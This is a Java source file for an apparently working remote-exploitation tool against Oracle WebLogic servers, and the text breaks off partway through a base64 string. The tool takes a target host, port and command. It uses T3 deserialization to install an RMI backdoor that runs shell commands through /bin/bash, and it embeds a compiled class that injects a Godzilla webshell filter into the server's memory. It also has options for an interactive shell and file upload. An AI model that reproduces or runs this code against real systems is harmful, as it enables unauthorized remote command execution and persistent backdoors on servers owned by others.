package com.boogipop;

import com.boogipop.serial.Reflections;
import com.boogipop.ssl.WeblogicTrustManager;
import com.boogipop.weblogic.T3ProtocolOperation;
import com.boogipop.weblogic.WebLogicOperation;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.cli.*;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;
import weblogic.utils.classloaders.ClasspathClassLoader;

import javax.naming.Context;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class Main {
    public static final String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
    public static String TYPE = "marshall";
    public static List<String> types = Arrays.asList(new String[]{"marshall", "collection", "streamMessageImpl"});
    public static String version;
    public static CommandLine cmdLine;
    private static String cmd = "whoami";
    private static byte[] bytes={-54, -2, -70, -66, 0, 0, 0, 52, 0, -109, 10, 0, 30, 0, 92, 7, 0, 93, 10, 0, 2, 0, 92, 8, 0, 94, 11, 0, 95, 0, 96, 8, 0, 97, 7, 0, 98, 10, 0, 7, 0, 99, 10, 0, 7, 0, 100, 10, 0, 7, 0, 101, 7, 0, 102, 7, 0, 103, 10, 0, 104, 0, 105, 10, 0, 12, 0, 106, 10, 0, 11, 0, 107, 7, 0, 108, 10, 0, 16, 0, 92, 10, 0, 11, 0, 109, 10, 0, 16, 0, 110, 8, 0, 111, 10, 0, 16, 0, 112, 7, 0, 113, 10, 0, 22, 0, 114, 7, 0, 115, 10, 0, 24, 0, 92, 8, 0, 116, 7, 0, 117, 10, 0, 27, 0, 92, 11, 0, 118, 0, 119, 7, 0, 120, 7, 0, 121, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 33, 76, 99, 111, 109, 47, 98, 111, 111, 103, 105, 112, 111, 112, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 4, 97, 114, 103, 115, 1, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 17, 115, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 3, 99, 109, 100, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 122, 1, 0, 17, 103, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 99, 109, 100, 115, 1, 0, 16, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 1, 0, 14, 112, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 1, 0, 26, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 4, 112, 114, 111, 99, 1, 0, 19, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 2, 98, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 2, 115, 98, 1, 0, 24, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 4, 108, 105, 110, 101, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 22, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 121, 112, 101, 84, 97, 98, 108, 101, 1, 0, 36, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 62, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 117, 7, 0, 123, 7, 0, 124, 7, 0, 98, 7, 0, 125, 7, 0, 102, 7, 0, 108, 7, 0, 113, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 7, 0, 126, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 3, 99, 116, 120, 1, 0, 22, 76, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 15, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 46, 106, 97, 118, 97, 12, 0, 32, 0, 33, 1, 0, 19, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 65, 114, 114, 97, 121, 76, 105, 115, 116, 1, 0, 9, 47, 98, 105, 110, 47, 98, 97, 115, 104, 7, 0, 124, 12, 0, 127, 0, -128, 1, 0, 2, 45, 99, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 12, 0, 32, 0, -127, 12, 0, -126, 0, -125, 12, 0, -124, 0, -123, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 7, 0, 125, 12, 0, -122, 0, -121, 12, 0, 32, 0, -120, 12, 0, 32, 0, -119, 1, 0, 22, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 12, 0, -118, 0, -117, 12, 0, -116, 0, -115, 1, 0, 1, 10, 12, 0, -114, 0, -117, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, -113, 0, -117, 1, 0, 27, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 73, 110, 105, 116, 105, 97, 108, 67, 111, 110, 116, 101, 120, 116, 1, 0, 8, 66, 111, 111, 103, 105, 112, 111, 112, 1, 0, 31, 99, 111, 109, 47, 98, 111, 111, 103, 105, 112, 111, 112, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 7, 0, -112, 12, 0, -111, 0, -110, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 46, 119, 101, 98, 108, 111, 103, 105, 99, 47, 99, 108, 117, 115, 116, 101, 114, 47, 115, 105, 110, 103, 108, 101, 116, 111, 110, 47, 67, 108, 117, 115, 116, 101, 114, 77, 97, 115, 116, 101, 114, 82, 101, 109, 111, 116, 101, 1, 0, 24, 106, 97, 118, 97, 47, 114, 109, 105, 47, 82, 101, 109, 111, 116, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 14, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 3, 97, 100, 100, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 41, 86, 1, 0, 19, 114, 101, 100, 105, 114, 101, 99, 116, 69, 114, 114, 111, 114, 83, 116, 114, 101, 97, 109, 1, 0, 29, 40, 90, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 5, 115, 116, 97, 114, 116, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 10, 103, 101, 116, 77, 101, 115, 115, 97, 103, 101, 1, 0, 20, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 1, 0, 6, 114, 101, 98, 105, 110, 100, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 0, 33, 0, 27, 0, 30, 0, 1, 0, 31, 0, 0, 0, 7, 0, 1, 0, 32, 0, 33, 0, 1, 0, 34, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 35, 0, 0, 0, 6, 0, 1, 0, 0, 0, 18, 0, 36, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 37, 0, 38, 0, 0, 0, 9, 0, 39, 0, 40, 0, 1, 0, 34, 0, 0, 0, 43, 0, 0, 0, 1, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 35, 0, 0, 0, 6, 0, 1, 0, 0, 0, 29, 0, 36, 0, 0, 0, 12, 0, 1, 0, 0, 0, 1, 0, 41, 0, 42, 0, 0, 0, 1, 0, 43, 0, 44, 0, 2, 0, 34, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 35, 0, 0, 0, 6, 0, 1, 0, 0, 0, 35, 0, 36, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 37, 0, 38, 0, 0, 0, 0, 0, 1, 0, 45, 0, 46, 0, 1, 0, 0, 0, 1, 0, 41, 0, 46, 0, 2, 0, 47, 0, 0, 0, 4, 0, 1, 0, 48, 0, 1, 0, 49, 0, 50, 0, 2, 0, 34, 0, 0, 1, 126, 0, 5, 0, 8, 0, 0, 0, 124, -69, 0, 2, 89, -73, 0, 3, 77, 44, 18, 4, -71, 0, 5, 2, 0, 87, 44, 18, 6, -71, 0, 5, 2, 0, 87, 44, 43, -71, 0, 5, 2, 0, 87, -69, 0, 7, 89, 44, -73, 0, 8, 78, 45, 4, -74, 0, 9, 87, 45, -74, 0, 10, 58, 4, -69, 0, 11, 89, -69, 0, 12, 89, 25, 4, -74, 0, 13, -73, 0, 14, -73, 0, 15, 58, 5, -69, 0, 16, 89, -73, 0, 17, 58, 6, 25, 5, -74, 0, 18, 89, 58, 7, -58, 0, 19, 25, 6, 25, 7, -74, 0, 19, 18, 20, -74, 0, 19, 87, -89, -1, -24, 25, 6, -74, 0, 21, -80, 77, 44, -74, 0, 23, -80, 0, 1, 0, 0, 0, 117, 0, 118, 0, 22, 0, 4, 0, 35, 0, 0, 0, 58, 0, 14, 0, 0, 0, 42, 0, 8, 0, 44, 0, 17, 0, 45, 0, 26, 0, 46, 0, 34, 0, 48, 0, 43, 0, 49, 0, 49, 0, 50, 0, 55, 0, 52, 0, 76, 0, 53, 0, 85, 0, 56, 0, 96, 0, 57, 0, 112, 0, 60, 0, 118, 0, 61, 0, 119, 0, 62, 0, 36, 0, 0, 0, 92, 0, 9, 0, 8, 0, 110, 0, 51, 0, 52, 0, 2, 0, 43, 0, 75, 0, 53, 0, 54, 0, 3, 0, 55, 0, 63, 0, 55, 0, 56, 0, 4, 0, 76, 0, 42, 0, 57, 0, 58, 0, 5, 0, 85, 0, 33, 0, 59, 0, 60, 0, 6, 0, 93, 0, 25, 0, 61, 0, 46, 0, 7, 0, 119, 0, 5, 0, 62, 0, 63, 0, 2, 0, 0, 0, 124, 0, 37, 0, 38, 0, 0, 0, 0, 0, 124, 0, 45, 0, 46, 0, 1, 0, 64, 0, 0, 0, 12, 0, 1, 0, 8, 0, 110, 0, 51, 0, 65, 0, 2, 0, 66, 0, 0, 0, 52, 0, 3, -1, 0, 85, 0, 7, 7, 0, 67, 7, 0, 68, 7, 0, 69, 7, 0, 70, 7, 0, 71, 7, 0, 72, 7, 0, 73, 0, 0, -4, 0, 26, 7, 0, 68, -1, 0, 5, 0, 2, 7, 0, 67, 7, 0, 68, 0, 1, 7, 0, 74, 0, 47, 0, 0, 0, 4, 0, 1, 0, 48, 0, 1, 0, 75, 0, 76, 0, 2, 0, 34, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 35, 0, 0, 0, 6, 0, 1, 0, 0, 0, 69, 0, 36, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 37, 0, 38, 0, 0, 0, 0, 0, 1, 0, 77, 0, 78, 0, 1, 0, 0, 0, 1, 0, 79, 0, 80, 0, 2, 0, 47, 0, 0, 0, 4, 0, 1, 0, 81, 0, 1, 0, 75, 0, 82, 0, 2, 0, 34, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 35, 0, 0, 0, 6, 0, 1, 0, 0, 0, 74, 0, 36, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 37, 0, 38, 0, 0, 0, 0, 0, 1, 0, 77, 0, 78, 0, 1, 0, 0, 0, 1, 0, 83, 0, 84, 0, 2, 0, 0, 0, 1, 0, 85, 0, 86, 0, 3, 0, 47, 0, 0, 0, 4, 0, 1, 0, 81, 0, 8, 0, 87, 0, 33, 0, 1, 0, 34, 0, 0, 0, 107, 0, 4, 0, 1, 0, 0, 0, 28, -69, 0, 24, 89, -73, 0, 25, 75, 42, 18, 26, -69, 0, 27, 89, -73, 0, 28, -71, 0, 29, 3, 0, -89, 0, 4, 75, -79, 0, 1, 0, 0, 0, 23, 0, 26, 0, 22, 0, 3, 0, 35, 0, 0, 0, 22, 0, 5, 0, 0, 0, 22, 0, 8, 0, 23, 0, 23, 0, 26, 0, 26, 0, 24, 0, 27, 0, 27, 0, 36, 0, 0, 0, 12, 0, 1, 0, 8, 0, 15, 0, 88, 0, 89, 0, 0, 0, 66, 0, 0, 0, 7, 0, 2, 90, 7, 0, 74, 0, 0, 1, 0, 90, 0, 0, 0, 2, 0, 91};
    public static void main(String[] args) throws FileNotFoundException {
        //tobytes();
        System.setProperty("weblogic.security.allowCryptoJDefaultJCEVerification", "true");
        System.setProperty("weblogic.security.allowCryptoJDefaultPRNG", "true");
        System.setProperty("weblogic.security.SSL.ignoreHostnameVerification", "true");
        System.setProperty("weblogic.security.TrustKeyStore", "DemoTrust");

        Options options = new Options();
        options.addOption("H", true, "Remote Host[need set]");
        options.addOption("P", true, "Remote Port[need set]");
        options.addOption("C", true, "Execute Command[need set]");
        options.addOption("T", true, "Payload Type" + types);
        options.addOption("U", false, "Uninstall rmi");
        options.addOption("B", false, "Runtime Blind Execute Command maybe you should select os type");
        options.addOption("os", true, "Os Type [windows,linux]");
        options.addOption("https", false, "enable https or tls");
        options.addOption("shell", false, "enable shell module");
        options.addOption("upload", false, "enable upload a file");
        options.addOption("src", true, "path to src file ");
        options.addOption("dst", true, "path to dst file ");
        options.addOption("noExecPath", false, "custom execute path");
        try {
            String host = "127.0.0.1";
            String port = "7001";
            CommandLineParser parser = new DefaultParser();
            cmdLine = parser.parse(options, args);

            if (cmdLine.hasOption("H")) {
                host = cmdLine.getOptionValue("H");
            } else {
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("test", options);
                System.exit(0);
            }

            if (cmdLine.hasOption("P")) {
                port = cmdLine.getOptionValue("P");
            }

            if (cmdLine.hasOption("C")) {
                cmd = cmdLine.getOptionValue("C");
            }

            if (cmdLine.hasOption("T")) {
                TYPE = cmdLine.getOptionValue("T");
            }

            if (cmdLine.hasOption("U")) {
                System.out.println("开始删除rmi实例");
                WebLogicOperation.unInstallRmi(host, port);
                System.out.println("后门删除实例");
                System.exit(0);
            }
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            invokeRMI(host,port);
            //Environment environment = new Environment();
            //environment.setProviderUrl(url);
            //environment.setEnableServerAffinity(false);
            //environment.setSSLClientTrustManager(new WeblogicTrustManager());
            //Context context = environment.getInitialContext();
            //ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Boogipop");
            //上面的是CVE2017-3248
            //下面的是IIOP打Weblogic
            //Hashtable env = new Hashtable();
            //env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            //env.put(Context.PROVIDER_URL, url);
            //env.put("weblogic.jndi.requestTimeout",15000L);
            //InitialContext initialContext = new InitialContext(env);
            //ClusterMasterRemote remote = (ClusterMasterRemote) initialContext.lookup("Boogipop");

            // 调用RMI实例执行命令
            //String res = remote.getServerLocation(cmd);
            //System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static void invokeRMI(String host,String port) throws Exception {
        String className="InjectWeblogicGodzilla4Filter";
        byte[] clsData= Base64.getDecoder().decode("yv66vgAAADQB0QoAYwEVCgBjARYKADYBFwgBGAoBGQEaBwEbCAEcCgAgAR0KAAYBHgoBGQEfCgEZASAHASEIASIKASMBJAoAIAElCgEjASYHAScKASMBKAoAEQEpCgARASoKACABKwgBLAoAHQEtCAEuCgAdAS8KATABMQoAHwEyCAEzBwE0BwB/BwE1BwE2CAE3CgAdATgIATkIAToIATsIATwIAT0IAT4HAT8KACkBFQoAKQFACgApAUEKADYBQgcBQwcBRAsALgFFCwAuAUYKADYBRwoANgFICAFJCwFKAUsHAUwKAB0BTQoANgEWCgA2AU4LAUoBTwgBUAsALgFPBwFRCgA9ARUKAB8BUgsALwFTCgAgAVQKAVUBVgoAHwFBCgA9AVcKADYBWAoAIAFZCwFaAVsKAAwBXAgBXQgBXgoAHQFfCgEwAWAHAWEHAWIKAE4BFQoATQFjCwFkAWUIAWYKACABUgoAHQFnCAFoCgAdAWkKAWoBYAoBagFrBwFsCgBZAW0LAW4BbwsBbgFwCgAdAXEIAXIIAXMHAXQLAXUBdggA0wcBdwgA1QgA1wgBeAgAzwgA0QgA0gcA4wcBeQgBeggBewgBfAcBfQcBfgcBfwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTEluamVjdFdlYmxvZ2ljR29kemlsbGE0RmlsdGVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcBTAcBgAcBIQEAA21kNQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBABJMamF2YS9sYW5nL1N0cmluZzsBAANyZXQHATYBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBgQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI2AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAARwYXNzAQACeGMHAYIHAYMHAYQHAUMHAUQHAYUHAYYBAAdkZXN0cm95AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAhjb250ZXh0RgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAANrZXkBAAljaGlsZHJlbkYBAANzZXQBABNMamF2YS91dGlsL0hhc2hTZXQ7AQACaXMBABRMamF2YS91dGlsL0l0ZXJhdG9yOwEAEmFwcGxpY2F0aW9uUnVudGltZQEANUx3ZWJsb2dpYy9tYW5hZ2VtZW50L3J1bnRpbWUvQXBwbGljYXRpb25SdW50aW1lTUJlYW47AQABaQEAAUkBAANwdXQBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADWZpbHRlck1hbmFnZXIBAA5yZWdpc3RlckZpbHRlcgEAC2NsYXNzTG9hZGVyAQAMY2xhc3NMb2FkZXIxAQANY2FjaGVkQ2xhc3NlcwEAEWNhY2hlZENsYXNzZXNfbWFwAQADZ2V0AQAUd2ViQXBwU2VydmxldENvbnRleHQBADBMd2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9XZWJBcHBTZXJ2bGV0Q29udGV4dDsBAA1zZXJ2ZXJSdW50aW1lAQAgTHdlYmxvZ2ljL3QzL3NydnIvU2VydmVyUnVudGltZTsBAARsaXN0AQAQTGphdmEvdXRpbC9MaXN0OwEABGFyciQBADZbTHdlYmxvZ2ljL21hbmFnZW1lbnQvcnVudGltZS9BcHBsaWNhdGlvblJ1bnRpbWVNQmVhbjsBAARsZW4kAQAGbWV0aG9kAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBABZMb2NhbFZhc